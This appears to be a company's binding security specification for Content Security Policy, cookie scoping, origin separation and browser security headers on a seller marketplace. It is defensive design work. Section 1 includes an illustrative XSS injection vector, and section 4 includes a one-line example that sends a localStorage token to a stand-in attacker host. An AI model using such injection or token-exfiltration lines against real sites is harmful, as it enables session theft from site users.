# ADU-SEC-01 — Content Security Policy and Browser Security Headers

**Version:** 1.0 · **Baseline date:** 24 August 2026
**Owner:** Founder / CEO (back-end) · COO/CTO (front-end)
**Status:** Binding security specification for every browser surface. **Prerequisite for the seller console taking its first authenticated session.**
**Related:** ADU-WEB-01 v1.0 §9 · ADU-ARCH-01 v2.0 §7 · ADU-PRD-01 v8.5 §23 · ADU-API-01 v1.3 · ADU-DPIA-01 v1.0

---

## 1. Why now

ADU-WEB-01 §9 accepted `'unsafe-inline'` on `script-src` and wrote its own expiry condition:

> *"reopen the decision if user-supplied content is ever rendered into a page."*

**That condition has fired twice.**

- **X6** put seller storefronts in the public codebase. Storefronts render **seller-written product descriptions, store names and buyer-written review text**.
- **ARCH-01 v2.0** made the seller console an authenticated surface where a session controls payout details, payment evidence and team membership.

The original decision was sound for what the site then was — static marketing copy nobody could inject into. It is no longer sound, and it was written with its own reopen trigger precisely so this moment would be noticed rather than inherited.

**The concrete attack.** A seller writes a product description containing `<img src=x onerror="...">`. Under `'unsafe-inline'`, that executes in every visitor's browser. If the console shares an origin with storefronts, it executes in a browser holding a session that can change a bank account.

---

## 2. What CSP does and does not do

**CSP is defence in depth. It is the second line, not the first.**

| Control | Role |
|---|---|
| **Output encoding** | **Primary.** React escapes by default; the risk is `dangerouslySetInnerHTML`. §11 |
| **Origin separation** | **Primary.** An XSS on a storefront should not be able to reach a console session at all. §3 |
| **Session storage** | **Primary.** A token JavaScript can read is a token XSS can steal. §4 |
| **CSP** | **Secondary.** Contains what gets through the first three |

> **§3 and §4 matter more than the policy in §5.** A correct CSP on a badly-scoped origin is weaker than a mediocre CSP on a well-scoped one. Both are specified here because they are decided together or not at all.

---

## 3. Origin architecture

**The domain is still open** (ADU-WEB-01 §14). **Its shape is decided here**, because the security boundary depends on it and it is far cheaper to choose now than to migrate later.

| Origin | Serves | Trust |
|---|---|---|
| `adulis.example` | Marketing pages **and storefronts** | Anonymous. **Renders user-supplied content** |
| `console.adulis.example` | Seller PWA | **Authenticated. Payout, evidence, team** |
| `api.adulis.example` | API for every client | Authenticated and anonymous |
| `media.adulis.example` | R2 behind a custom domain | Public product media only |

**INVARIANT — the console is a separate origin from any surface that renders user-supplied content.**

This is the control that actually protects the payout surface. Under the same-origin policy, script executing on `adulis.example` cannot read cookies scoped to `console.adulis.example`, cannot read its DOM, and cannot make credentialed requests as that origin. **A storefront XSS becomes a storefront problem instead of a payout problem.**

**INVARIANT — the console session cookie is host-scoped, never domain-scoped.** No `Domain=.adulis.example`. The `__Host-` prefix in §4 enforces this at the browser.

**Subdomain caveat, and it is why storefronts stay on the apex.** A subdomain can set cookies for its parent domain. Putting storefronts on `shop.adulis.example` would mean seller-injected script on a subdomain could set cookies readable at the apex. Storefronts and marketing share the apex; only the console is separated, and it is separated in the direction that matters.

---

## 4. Session storage — the control that does most of the work

**ADU-API-01 §5 specifies opaque bearer tokens rather than JWTs**, for the right reason: revocation must take effect immediately and a JWT invites stateless validation that outlives its row. It does not say **where a browser keeps that token**, and the answer decides whether XSS is survivable.

| Storage | Under XSS |
|---|---|
| `localStorage` / `sessionStorage` | **Stolen in one line.** `fetch(evil, {body: localStorage.token})` |
| In-memory JS variable | Stolen — the attacker's script runs in the same context |
| **httpOnly cookie** | **Not readable by script.** The attacker can make requests *as* the user while the page is open, and cannot exfiltrate a credential that outlives the session |

> **INVARIANT — the seller console authenticates with an httpOnly session cookie, never a token in JavaScript-reachable storage.**
>
> ```
> Set-Cookie: __Host-adulis_session=<opaque>;
>             HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=<seller lifetime>
> ```
>
> `__Host-` requires `Secure`, `Path=/` and **no `Domain` attribute** — the browser refuses the cookie otherwise, so host-scoping is enforced by the client and not by our discipline.

**`SameSite=Strict` handles CSRF for the console.** It is acceptable here because the console is never entered by a cross-site link — a seller navigates to it directly, and ADU-ARCH-01 §4 forbids any deep link into billing from the app anyway.

**INVARIANT — the mobile app keeps the bearer header.** Native secure storage has no XSS surface, and `Authorization: Bearer` remains correct there. **ADU-API-01 therefore accepts two credential presentations**, chosen by surface: cookie for `SELLER_WEB` and `COURIER_WEB`, bearer for `MOBILE`.

⚠ **This is a change to ADU-API-01 §5 and needs recording there** — v1.3 describes bearer tokens without qualifying the browser case.

---

## 5. The policies

### 5.1 Public web — `adulis.example`

```
Content-Security-Policy:
  default-src 'none';
  script-src 'self' 'nonce-{NONCE}' 'strict-dynamic';
  style-src 'self' 'unsafe-inline';
  img-src 'self' https://media.adulis.example data:;
  font-src 'self';
  connect-src 'self' https://api.adulis.example;
  frame-src https://www.tiktok.com https://www.instagram.com;
  form-action 'self';
  frame-ancestors 'none';
  base-uri 'none';
  object-src 'none';
  manifest-src 'self';
  upgrade-insecure-requests;
  report-to csp;
```

### 5.2 Seller console — `console.adulis.example`

Stricter, because the stakes are higher and there is no third-party surface to accommodate.

```
Content-Security-Policy:
  default-src 'none';
  script-src 'self' 'nonce-{NONCE}' 'strict-dynamic';
  style-src 'self' 'unsafe-inline';
  img-src 'self' https://media.adulis.example blob:;
  font-src 'self';
  connect-src 'self' https://api.adulis.example;
  frame-src 'none';
  form-action 'self';
  frame-ancestors 'none';
  base-uri 'none';
  object-src 'none';
  worker-src 'self';
  manifest-src 'self';
  require-trusted-types-for 'script';
  upgrade-insecure-requests;
  report-to csp;
```

**Four differences from the public policy, each deliberate:**

- **`frame-src 'none'`** — the console has no reason to frame anything. Social embeds belong on storefronts.
- **`blob:` in `img-src`** — required by the payment evidence viewer. §7.
- **`worker-src 'self'`** — the PWA service worker. A poisoned service worker is persistent XSS that survives reload, so its source is pinned.
- **`require-trusted-types-for 'script'`** — kills DOM XSS sinks (`innerHTML`, `eval`) at the browser in supporting engines. Viable on the console because it is a new codebase; not proposed for the public site where a third-party embed may break under it.

### 5.3 API — `api.adulis.example`

JSON only, and a policy that says so:

```
Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; sandbox
X-Content-Type-Options: nosniff
```

`sandbox` and `default-src 'none'` mean that if a response is ever rendered as a document — through a content-type error, or a browser sniffing bytes — **nothing in it executes.**

---

## 6. Directive rationale

| Directive | Choice | Why |
|---|---|---|
| `default-src 'none'` | Start closed | Every resource type must be named. A directive nobody thought about fails closed |
| `script-src` | nonce + `strict-dynamic` | §8 |
| `style-src` | `'unsafe-inline'` | A documented concession — §9 |
| `img-src` | Self, media origin, `data:` (public) / `blob:` (console) | `data:` for inline SVG icons; `blob:` for authenticated evidence. **No `https:` wildcard** |
| `font-src 'self'` | Self-hosted only | ADU-WEB-01 §9 self-hosts Inter and Noto Sans Ethiopic with their own `unicode-range`. **No Google Fonts**, which is also why no third-party font origin appears here |
| `connect-src` | Self + API | Blocks exfiltration to an arbitrary endpoint — the step most XSS payloads need |
| `frame-ancestors 'none'` | Nothing may frame us | **Clickjacking defence.** Critical for the console: a payout change flow framed invisibly under a decoy is a real attack |
| `form-action 'self'` | No cross-origin posts | Stops an injected `<form>` posting credentials elsewhere |
| `base-uri 'none'` | No `<base>` | A `<base href>` injection redirects every relative script URL — a well-known nonce bypass |
| `object-src 'none'` | No plugins | Legacy attack surface with no legitimate use |
| `upgrade-insecure-requests` | Alongside HSTS | ADU-PRD-01 §23 requires HSTS; this catches mixed content |

---

## 7. Payment evidence — how the console displays it

The evidence viewer is where CSP, the isolated boundary and the access log meet, and it is worth stating end to end because getting it wrong defeats all three.

1. The console requests `GET /v1/seller/orders/{id}/payment-evidence` **with the session cookie.**
2. The API calls `financial.read_payment_evidence(...)`, which **writes the access-log row in the same transaction as the read** (ADU-DB-01 §13.3).
3. Bytes are returned in the response body with `Cache-Control: private, no-store`.
4. The client creates a **blob URL** and renders it. The blob URL is per-session, unguessable, and dies with the page.

**INVARIANT — payment evidence is never at a predictable or publicly reachable URL.** There is no `media.adulis.example/evidence/...`. **It is not media; it is evidence held in an isolated boundary**, and the only route to it is an authenticated call that logs.

This is why `blob:` appears in the console's `img-src` and nowhere else.

---

## 8. Nonces in Next.js 15

**A nonce is generated per request, so it cannot come from a static `_headers` file.** On Cloudflare Pages it comes from middleware running at the edge.

```ts
// middleware.ts
export function middleware(request: NextRequest) {
  const nonce = btoa(crypto.randomUUID());
  const csp = `default-src 'none'; script-src 'self' 'nonce-${nonce}' 'strict-dynamic'; ...`;

  const headers = new Headers(request.headers);
  headers.set('x-nonce', nonce);
  headers.set('content-security-policy', csp);

  const response = NextResponse.next({ request: { headers } });
  response.headers.set('content-security-policy', csp);
  return response;
}
```

The nonce is set on **both** the forwarded request headers and the response: the framework reads it from the request to tag its own injected scripts, and the browser reads it from the response.

**Why `'strict-dynamic'`.** Next.js loads further scripts from the ones it injects. Without it, every chunk would need its own nonce. With it, a script the browser already trusts may load others — and **host allowlists in `script-src` are ignored entirely by supporting browsers**, which is a feature: an allowlist is the weakest part of most policies. `'self'` remains as a fallback for engines that do not implement `'strict-dynamic'`.

⚠ **`'unsafe-eval'` must not appear in production.** Next.js development mode requires it; the production policy does not. **Verify the built output rather than assuming** — §13 makes this a CI check.

⚠ **The exact framework nonce API changes between versions.** Verify against current Next.js documentation at implementation time; the mechanism above is stable, the specific header names may not be.

---

## 9. The `style-src 'unsafe-inline'` concession

**It is a concession, and it is defensible. `script-src 'unsafe-inline'` would not be.**

**Why it is needed.** Tailwind and `next/font` both emit inline styles, and `next/font` is what makes the two-family stack in ADU-WEB-01 §8.2 work — Inter first with Noto Sans Ethiopic as fallback, each with its own `unicode-range` so an English page never downloads the Ethiopic file. Nonce-ing every generated style block would mean giving that up or fighting the framework on every release.

**Why it is acceptable.** Inline CSS cannot execute JavaScript in any current browser. `expression()` was removed with IE, `javascript:` URLs in CSS do not execute, and `-moz-binding` is gone. **The residual is CSS-based exfiltration** — attribute selectors with `background-image: url(...)` reading form values — which requires an injection point that `script-src` already blocks, and which `connect-src` and `img-src` further constrain by limiting where a request may go.

> **The asymmetry stated plainly:** `script-src 'unsafe-inline'` gives an attacker arbitrary code execution. `style-src 'unsafe-inline'` gives them, at worst, a slow side channel through an injection point they do not have.

**Revisit trigger, written down so this concession also expires rather than being inherited:** move to hashes or nonces if the framework makes it practical, **or immediately** if any surface begins rendering user-supplied CSS or style attributes.

---

## 10. Social embeds — iframe only, never their script

ADU-PRD-01 §7.4: video is embed by default, **click-to-play with a poster frame Adulis stores itself**, and *"the product page must remain fully functional without the embed."*

> **INVARIANT — social embeds are `<iframe>` elements pointing at the platform's own embed URL. The TikTok and Instagram embed SDK scripts are never loaded.**

The SDKs exist to auto-discover embeds and restyle them. Loading one would mean adding a third-party origin to `script-src` — **executing someone else's code, updated without notice, on the page that renders a seller's storefront.** The iframe alone gives the same video, isolated in its own origin, unable to touch our DOM.

Consequences that all point the same way:

- `frame-src` names two origins; `script-src` names none.
- **Click-to-load means no third-party request until the buyer asks for one** — which is a performance win on the low-end Android that is the binding constraint (§23), and a privacy win the DPIA can rely on: no data reaches TikTok on page load.
- The poster frame is served from `media.adulis.example`, already allowed.

---

## 11. What CSP does not fix

**CSP contains an XSS. It does not prevent one.** Three invariants do that, and they belong in the front-end codebase rather than in a header.

> **INVARIANT — `dangerouslySetInnerHTML` is not used on any surface that renders user-supplied content.** Seller store names, product descriptions, review bodies and chat messages render as text. React escapes by default; this invariant is about not opting out.

> **INVARIANT — product descriptions and reviews are plain text.** No markdown, no HTML, no rich-text editor. If rich text is ever wanted, it arrives with server-side sanitisation against an allowlist — never with client-side filtering, which is bypassable by definition.

> **INVARIANT — no user-supplied value reaches an `href`, `src`, or style attribute without scheme validation.** `javascript:` in a link is XSS that no `script-src` catches, because the browser treats it as a navigation.

**The last one is live today.** ADU-PRD-01 §7.1 records a **source social post URL** per product, supplied by the seller. It is validated for platform and canonical id at §7.5.1 — **validate the scheme too**, and render it as text or a checked link, never as an unchecked `href`.

---

## 12. Additional headers

Applied on every response from every browser surface.

```
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=(),
                    usb=(), interest-cohort=()
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-site
X-Frame-Options: DENY
```

**Notes.**

- **HSTS with `includeSubDomains` covers the console.** Submit for preload only once every subdomain is HTTPS-only — `preload` is difficult to reverse.
- **`Referrer-Policy`** stops a storefront path leaking to an embed origin. A path can carry a seller handle; that is not for TikTok to receive.
- **`Permissions-Policy` denies everything by default.** No browser surface needs camera, microphone or geolocation — the QR scan is in the native app. Add back on demonstrated need, not in advance.
- **`X-Frame-Options: DENY`** is redundant beside `frame-ancestors` and costs one header for old browsers.

---

## 13. Reporting and rollout

### 13.1 Reporting

```
Reporting-Endpoints: csp="https://api.adulis.example/v1/csp-report"
```

The endpoint is **self-hosted**, per ADU-WEB-01 §9's refusal to add a third party to any data flow. Three requirements, and the first is not optional:

⚠ **Rate limit it.** A public unauthenticated POST endpoint that writes to a database is a denial-of-service vector, and browsers send reports in bursts. Use `core.rate_limit_bucket` with an `IP_HASH` subject.

⚠ **CSP reports contain URLs, and a URL can carry an identifier.** A blocked-URI or document-URI may include a seller handle or an order reference. **The endpoint is a personal-data processing activity** — retention of 30 days, and it belongs in ADU-DPIA-01 §4's inventory as P16.

Reports are stored, not just counted. A blocked script with no attribution is not actionable.

### 13.2 Rollout

| Step | Action | Duration |
|---|---|---|
| **1** | `Content-Security-Policy-Report-Only` on both apps | 2 weeks |
| **2** | Triage every violation. Fix the app, never widen the policy without a written reason | — |
| **3** | **Enforce on the console first** | — |
| **4** | Enforce on the public web | — |
| **5** | Consider `require-trusted-types-for` on public | Post-launch |

**Console first, deliberately.** It is the higher-stakes surface and the simpler policy — no embeds, no third-party origins, one team building it. The public site has social embeds and will generate more noise; enforcing there first would tempt widening the policy to silence violations, which is how `'unsafe-inline'` gets reintroduced.

**INVARIANT — the console does not take its first authenticated session under Report-Only.** ADU-ARCH-01 §7 makes enforced CSP a prerequisite, and step 3 is that prerequisite.

---

## 14. Verification

Checks that run in CI and fail the build, in the manner of ADU-DB-01's Appendix C.

| # | Check | Expected |
|---|---|---|
| 1 | `grep -r "unsafe-inline" middleware` in `script-src` | **0** |
| 2 | `grep -r "unsafe-eval"` in the production bundle | **0** |
| 3 | `grep -r "dangerouslySetInnerHTML"` | **0** |
| 4 | `grep -rE "localStorage.*(token\|session)"` in the console app | **0** |
| 5 | Response headers on a built preview carry all of §12 | All present |
| 6 | `Set-Cookie` on console sign-in carries `__Host-`, `HttpOnly`, `Secure`, `SameSite=Strict` | All four |
| 7 | Two consecutive requests return **different** nonces | Different |
| 8 | `script-src` contains no `https:` wildcard and no third-party origin | Self and nonce only |
| 9 | An automated header scan on every deployed origin | No downgrade |

**Check 7 is the one that silently fails.** A nonce that is constant — cached at the edge, or hard-coded during debugging — is worse than no nonce, because the policy looks correct and permits any injected script carrying the known value. **Cloudflare Pages must not cache a document response carrying a nonce**; `Cache-Control: private, no-store` on HTML documents, with caching restricted to static assets.

---

## 15. Open items

| Item | Blocks | Owner |
|---|---|---|
| **Domain** | Every origin in §3. **The shape is decided; the name is not** | CEO |
| **Console cookie change to ADU-API-01 §5** | Console authentication build | CEO |
| **HSTS preload submission** | Post-launch, once every subdomain is HTTPS-only | CEO |
| **CSP report retention and DPIA entry** | Report endpoint going live | CEO |
| **Trusted Types on public web** | Post-launch, after embed compatibility is measured | COO/CTO |

---

*Binding security specification. §3 origin separation and §4 httpOnly cookies do more to protect the payout surface than the policy itself; all three are specified together because they are decided together. The concession in §9 carries its own expiry trigger, in the manner of the one it replaces — which fired exactly as ADU-WEB-01 intended it to.*
